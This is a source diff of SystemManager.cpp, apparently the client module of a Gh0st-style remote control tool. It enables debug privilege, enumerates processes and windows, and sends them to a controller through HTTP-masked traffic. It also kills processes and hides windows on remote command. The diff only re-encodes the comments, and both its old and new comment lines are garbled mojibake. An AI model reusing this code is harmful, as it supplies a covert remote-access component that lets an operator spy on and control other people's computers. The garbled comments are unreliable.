@@ -1,4 +1,4 @@
-// SystemManager.cpp: implementation of the CSystemManager class.
+ï»¿// SystemManager.cpp: implementation of the CSystemManager class.
 //
 //////////////////////////////////////////////////////////////////////
 
@@ -24,17 +24,17 @@
 CSystemManager::CSystemManager(IOCPClient* ClientObject,BOOL bHow, void* user):CManager(ClientObject)
 {
     if (bHow==COMMAND_SYSTEM) {
-        //½ø³Ì
+        //è¿›ç¨‹
         SendProcessList();
     } else if (bHow==COMMAND_WSLIST) {
-        //´°¿Ú
+        //çª—å£
         SendWindowsList();
     }
 }
 
 VOID CSystemManager::SendProcessList()
 {
-    LPBYTE	szBuffer = GetProcessList();            //µÃµ½½ø³ÌÁĞ±íµÄÊı¾İ
+    LPBYTE	szBuffer = GetProcessList();            //å¾—åˆ°è¿›ç¨‹åˆ—è¡¨çš„æ•°æ®
     if (szBuffer == NULL)
         return;
     HttpMask mask(DEFAULT_HOST, m_ClientObject->GetClientIPHeader());
@@ -46,7 +46,7 @@ VOID CSystemManager::SendProcessList()
 
 void CSystemManager::SendWindowsList()
 {
-    LPBYTE	szBuffer = GetWindowsList();          //µÃµ½´°¿ÚÁĞ±íµÄÊı¾İ
+    LPBYTE	szBuffer = GetWindowsList();          //å¾—åˆ°çª—å£åˆ—è¡¨çš„æ•°æ®
     if (szBuffer == NULL)
         return;
     HttpMask mask(DEFAULT_HOST, m_ClientObject->GetClientIPHeader());
@@ -56,7 +56,7 @@ void CSystemManager::SendWindowsList()
 
 LPBYTE CSystemManager::GetProcessList()
 {
-    DebugPrivilege(SE_DEBUG_NAME,TRUE);     //ÌáÈ¡È¨ÏŞ
+    DebugPrivilege(SE_DEBUG_NAME,TRUE);     //æå–æƒé™
 
     HANDLE          hProcess  = NULL;
     HANDLE			hSnapshot = NULL;
@@ -68,23 +68,23 @@ LPBYTE CSystemManager::GetProcessList()
     DWORD           dwOffset = 0;
     DWORD           dwLength = 0;
     DWORD			cbNeeded = 0;
-    HMODULE			hModules = NULL;   //½ø³ÌÖĞµÚÒ»¸öÄ£¿éµÄ¾ä±ú
+    HMODULE			hModules = NULL;   //è¿›ç¨‹ä¸­ç¬¬ä¸€ä¸ªæ¨¡å—çš„å¥æŸ„
 
-    LPBYTE szBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);       //ÔİÊ±·ÖÅäÒ»ÏÂ»º³åÇø
+    LPBYTE szBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);       //æš‚æ—¶åˆ†é…ä¸€ä¸‹ç¼“å†²åŒº
     if (szBuffer == NULL)
         return NULL;
-    szBuffer[0] = TOKEN_PSLIST;                      //×¢ÒâÕâ¸öÊÇÊı¾İÍ·
+    szBuffer[0] = TOKEN_PSLIST;                      //æ³¨æ„è¿™ä¸ªæ˜¯æ•°æ®å¤´
     dwOffset = 1;
 
-    if(Process32First(hSnapshot, &pe32)) {           //µÃµ½µÚÒ»¸ö½ø³ÌË³±ãÅĞ¶ÏÒ»ÏÂÏµÍ³¿ìÕÕÊÇ·ñ³É¹¦
+    if(Process32First(hSnapshot, &pe32)) {           //å¾—åˆ°ç¬¬ä¸€ä¸ªè¿›ç¨‹é¡ºä¾¿åˆ¤æ–­ä¸€ä¸‹ç³»ç»Ÿå¿«ç…§æ˜¯å¦æˆåŠŸ
         do {
-            //´ò¿ª½ø³Ì²¢·µ»Ø¾ä±ú
+            //æ‰“å¼€è¿›ç¨‹å¹¶è¿”å›å¥æŸ„
             hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
-                                   FALSE, pe32.th32ProcessID);   //´ò¿ªÄ¿±ê½ø³Ì
+                                   FALSE, pe32.th32ProcessID);   //æ‰“å¼€ç›®æ ‡è¿›ç¨‹
             {
-                //Ã¶¾ÙµÚÒ»¸öÄ£¿é¾ä±úÒ²¾ÍÊÇµ±Ç°½ø³ÌÍêÕûÂ·¾¶
+                //æšä¸¾ç¬¬ä¸€ä¸ªæ¨¡å—å¥æŸ„ä¹Ÿå°±æ˜¯å½“å‰è¿›ç¨‹å®Œæ•´è·¯å¾„
                 EnumProcessModules(hProcess, &hModules, sizeof(hModules), &cbNeeded);
-                //µÃµ½×ÔÉíµÄÍêÕûÃû³Æ
+                //å¾—åˆ°è‡ªèº«çš„å®Œæ•´åç§°
                 DWORD dwReturn = GetModuleFileNameEx(hProcess, hModules,
                                                      szProcessFullPath,
                                                      sizeof(szProcessFullPath));
@@ -97,18 +97,18 @@ LPBYTE CSystemManager::GetProcessList()
                 const char* arch = is64Bit ? "x64" : "x86";
                 char exeFile[300];
                 sprintf(exeFile, "%s:%s", pe32.szExeFile, arch);
-                //¿ªÊ¼¼ÆËãÕ¼ÓÃµÄ»º³åÇø£¬ ÎÒÃÇ¹ØĞÄËûµÄ·¢ËÍµÄÊı¾İ½á¹¹
-                // ´Ë½ø³ÌÕ¼ÓÃÊı¾İ´óĞ¡
+                //å¼€å§‹è®¡ç®—å ç”¨çš„ç¼“å†²åŒºï¼Œ æˆ‘ä»¬å…³å¿ƒä»–çš„å‘é€çš„æ•°æ®ç»“æ„
+                // æ­¤è¿›ç¨‹å ç”¨æ•°æ®å¤§å°
                 dwLength = sizeof(DWORD) +
                            lstrlen(exeFile) + lstrlen(szProcessFullPath) + 2;
-                // »º³åÇøÌ«Ğ¡£¬ÔÙÖØĞÂ·ÖÅäÏÂ
+                // ç¼“å†²åŒºå¤ªå°ï¼Œå†é‡æ–°åˆ†é…ä¸‹
                 if (LocalSize(szBuffer) < (dwOffset + dwLength))
                     szBuffer = (LPBYTE)LocalReAlloc(szBuffer, (dwOffset + dwLength),
                                                     LMEM_ZEROINIT|LMEM_MOVEABLE);
 
-                //½ÓÏÂÀ´Èı¸ömemcpy¾ÍÊÇÏò»º³åÇøÀï´æ·ÅÊı¾İ Êı¾İ½á¹¹ÊÇ
-                //½ø³ÌID+½ø³ÌÃû+0+½ø³ÌÍêÕûÃû+0  ½ø³Ì
-                //ÒòÎª×Ö·ûÊı¾İÊÇÒÔ0 ½áÎ²µÄ
+                //æ¥ä¸‹æ¥ä¸‰ä¸ªmemcpyå°±æ˜¯å‘ç¼“å†²åŒºé‡Œå­˜æ”¾æ•°æ® æ•°æ®ç»“æ„æ˜¯
+                //è¿›ç¨‹ID+è¿›ç¨‹å+0+è¿›ç¨‹å®Œæ•´å+0  è¿›ç¨‹
+                //å› ä¸ºå­—ç¬¦æ•°æ®æ˜¯ä»¥0 ç»“å°¾çš„
                 memcpy(szBuffer + dwOffset, &(pe32.th32ProcessID), sizeof(DWORD));
                 dwOffset += sizeof(DWORD);
 
@@ -118,17 +118,17 @@ LPBYTE CSystemManager::GetProcessList()
                 memcpy(szBuffer + dwOffset, szProcessFullPath, lstrlen(szProcessFullPath) + 1);
                 dwOffset += lstrlen(szProcessFullPath) + 1;
             }
-        } while(Process32Next(hSnapshot, &pe32));    //¼ÌĞøµÃµ½ÏÂÒ»¸ö¿ìÕÕ
+        } while(Process32Next(hSnapshot, &pe32));    //ç»§ç»­å¾—åˆ°ä¸‹ä¸€ä¸ªå¿«ç…§
     }
 
-    DebugPrivilege(SE_DEBUG_NAME,FALSE);  //»¹Ô­ÌáÈ¨
-    SAFE_CLOSE_HANDLE(hSnapshot);       //ÊÍ·Å¾ä±ú
+    DebugPrivilege(SE_DEBUG_NAME,FALSE);  //è¿˜åŸææƒ
+    SAFE_CLOSE_HANDLE(hSnapshot);       //é‡Šæ”¾å¥æŸ„
     return szBuffer;
 }
 
 CSystemManager::~CSystemManager()
 {
-    Mprintf("ÏµÍ³Îö¹¹\n");
+    Mprintf("ç³»ç»Ÿææ„\n");
 }
 
 BOOL CSystemManager::DebugPrivilege(const char *szName, BOOL bEnable)
@@ -137,7 +137,7 @@ BOOL CSystemManager::DebugPrivilege(const char *szName, BOOL bEnable)
     HANDLE            hToken;
     TOKEN_PRIVILEGES  TokenPrivileges;
 
-    //½ø³Ì Token ÁîÅÆ
+    //è¿›ç¨‹ Token ä»¤ç‰Œ
     if (!OpenProcessToken(GetCurrentProcess(),
                           TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken)) {
         bResult = FALSE;
@@ -182,7 +182,7 @@ VOID  CSystemManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 
         break;
     }
-    case CMD_WINDOW_TEST: {  //²Ù×÷´°¿Ú
+    case CMD_WINDOW_TEST: {  //æ“ä½œçª—å£
         TestWindow(szBuffer+1);
         break;
     }
@@ -192,46 +192,46 @@ VOID  CSystemManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
     }
 }
 
-void CSystemManager::TestWindow(LPBYTE szBuffer)    //´°¿ÚµÄ×î´ó ×îĞ¡ Òş²Ø¶¼ÔÚÕâÀï´¦Àí
+void CSystemManager::TestWindow(LPBYTE szBuffer)    //çª—å£çš„æœ€å¤§ æœ€å° éšè—éƒ½åœ¨è¿™é‡Œå¤„ç†
 {
     DWORD Hwnd;
     DWORD dHow;
-    memcpy((void*)&Hwnd,szBuffer,sizeof(DWORD));            //µÃµ½´°¿Ú¾ä±ú
-    memcpy(&dHow,szBuffer+sizeof(DWORD),sizeof(DWORD));     //µÃµ½´°¿Ú´¦Àí²ÎÊı
+    memcpy((void*)&Hwnd,szBuffer,sizeof(DWORD));            //å¾—åˆ°çª—å£å¥æŸ„
+    memcpy(&dHow,szBuffer+sizeof(DWORD),sizeof(DWORD));     //å¾—åˆ°çª—å£å¤„ç†å‚æ•°
     ShowWindow((HWND__ *)Hwnd,dHow);
-    //´°¿Ú¾ä±ú ¸ÉÉ¶(´ó Ğ¡ Òş²Ø »¹Ô­)
+    //çª—å£å¥æŸ„ å¹²å•¥(å¤§ å° éšè— è¿˜åŸ)
 }
 
 VOID CSystemManager::KillProcess(LPBYTE szBuffer, UINT ulLength)
 {
     HANDLE hProcess = NULL;
-    DebugPrivilege(SE_DEBUG_NAME, TRUE);  //ÌáÈ¨
+    DebugPrivilege(SE_DEBUG_NAME, TRUE);  //ææƒ
 
     for (int i = 0; i < ulLength; i += 4)
-        //ÒòÎª½áÊøµÄ¿ÉÄÜ¸ö²»Ö¹ÊÇÒ»¸ö½ø³Ì
+        //å› ä¸ºç»“æŸçš„å¯èƒ½ä¸ªä¸æ­¢æ˜¯ä¸€ä¸ªè¿›ç¨‹
     {
-        //´ò¿ª½ø³Ì
+        //æ‰“å¼€è¿›ç¨‹
         hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *(LPDWORD)(szBuffer + i));
-        //½áÊø½ø³Ì
+        //ç»“æŸè¿›ç¨‹
         TerminateProcess(hProcess, 0);
         SAFE_CLOSE_HANDLE(hProcess);
     }
-    DebugPrivilege(SE_DEBUG_NAME, FALSE);    //»¹Ô­ÌáÈ¨
-    // ÉÔÉÔSleepÏÂ£¬·ÀÖ¹³ö´í
+    DebugPrivilege(SE_DEBUG_NAME, FALSE);    //è¿˜åŸææƒ
+    // ç¨ç¨Sleepä¸‹ï¼Œé˜²æ­¢å‡ºé”™
     Sleep(100);
 }
 
 LPBYTE CSystemManager::GetWindowsList()
 {
     LPBYTE	szBuffer = NULL;  //char* p = NULL   &p
-    EnumWindows((WNDENUMPROC)EnumWindowsProc, (LPARAM)&szBuffer);  //×¢²áº¯Êı
-    //Èç¹ûAPIº¯Êı²ÎÊıµ±ÖĞÓĞº¯ÊıÖ¸Õë´æÔÚ
-    //¾ÍÊÇÏòÏµÍ³×¢²áÒ»¸ö »Øµ÷º¯Êı
+    EnumWindows((WNDENUMPROC)EnumWindowsProc, (LPARAM)&szBuffer);  //æ³¨å†Œå‡½æ•°
+    //å¦‚æœAPIå‡½æ•°å‚æ•°å½“ä¸­æœ‰å‡½æ•°æŒ‡é’ˆå­˜åœ¨
+    //å°±æ˜¯å‘ç³»ç»Ÿæ³¨å†Œä¸€ä¸ª å›è°ƒå‡½æ•°
     szBuffer[0] = TOKEN_WSLIST;
     return szBuffer;
 }
 
-BOOL CALLBACK CSystemManager::EnumWindowsProc(HWND hWnd, LPARAM lParam)  //ÒªÊı¾İ **
+BOOL CALLBACK CSystemManager::EnumWindowsProc(HWND hWnd, LPARAM lParam)  //è¦æ•°æ® **
 {
     DWORD	dwLength = 0;
     DWORD	dwOffset = 0;
@@ -240,24 +240,24 @@ BOOL CALLBACK CSystemManager::EnumWindowsProc(HWND hWnd, LPARAM lParam)  //ÒªÊı¾
 
     char	szTitle[1024];
     memset(szTitle, 0, sizeof(szTitle));
-    //µÃµ½ÏµÍ³´«µİ½øÀ´µÄ´°¿Ú¾ä±úµÄ´°¿Ú±êÌâ
+    //å¾—åˆ°ç³»ç»Ÿä¼ é€’è¿›æ¥çš„çª—å£å¥æŸ„çš„çª—å£æ ‡é¢˜
     GetWindowText(hWnd, szTitle, sizeof(szTitle));
-    //ÕâÀïÅĞ¶Ï ´°¿ÚÊÇ·ñ¿É¼û »ò±êÌâÎª¿Õ
+    //è¿™é‡Œåˆ¤æ–­ çª—å£æ˜¯å¦å¯è§ æˆ–æ ‡é¢˜ä¸ºç©º
     if (!IsWindowVisible(hWnd) || lstrlen(szTitle) == 0)
         return true;
-    //Í¬½ø³Ì¹ÜÀíÒ»ÑùÎÒÃÇ×¢ÒâËûµÄ·¢ËÍµ½Ö÷¿Ø¶ËµÄÊı¾İ½á¹¹
+    //åŒè¿›ç¨‹ç®¡ç†ä¸€æ ·æˆ‘ä»¬æ³¨æ„ä»–çš„å‘é€åˆ°ä¸»æ§ç«¯çš„æ•°æ®ç»“æ„
     if (szBuffer == NULL)
-        szBuffer = (LPBYTE)LocalAlloc(LPTR, 1);  //ÔİÊ±·ÖÅä»º³åÇø
+        szBuffer = (LPBYTE)LocalAlloc(LPTR, 1);  //æš‚æ—¶åˆ†é…ç¼“å†²åŒº
     if (szBuffer == NULL)
         return FALSE;
-    //[ÏûÏ¢][4Notepad.exe\0]
+    //[æ¶ˆæ¯][4Notepad.exe\0]
     dwLength = sizeof(DWORD) + lstrlen(szTitle) + 1;
     dwOffset = LocalSize(szBuffer);  //1
-    //ÖØĞÂ¼ÆËã»º³åÇø´óĞ¡
+    //é‡æ–°è®¡ç®—ç¼“å†²åŒºå¤§å°
     szBuffer = (LPBYTE)LocalReAlloc(szBuffer, dwOffset + dwLength, LMEM_ZEROINIT|LMEM_MOVEABLE);
     if (szBuffer == NULL)
         return FALSE;
-    //ÏÂÃæÁ½¸ömemcpy¾ÍÄÜ¿´µ½Êı¾İ½á¹¹Îª hwnd+´°¿Ú±êÌâ+0
+    //ä¸‹é¢ä¸¤ä¸ªmemcpyå°±èƒ½çœ‹åˆ°æ•°æ®ç»“æ„ä¸º hwnd+çª—å£æ ‡é¢˜+0
     memcpy((szBuffer+dwOffset),&hWnd,sizeof(DWORD));
     memcpy(szBuffer + dwOffset + sizeof(DWORD), szTitle, lstrlen(szTitle) + 1);
 
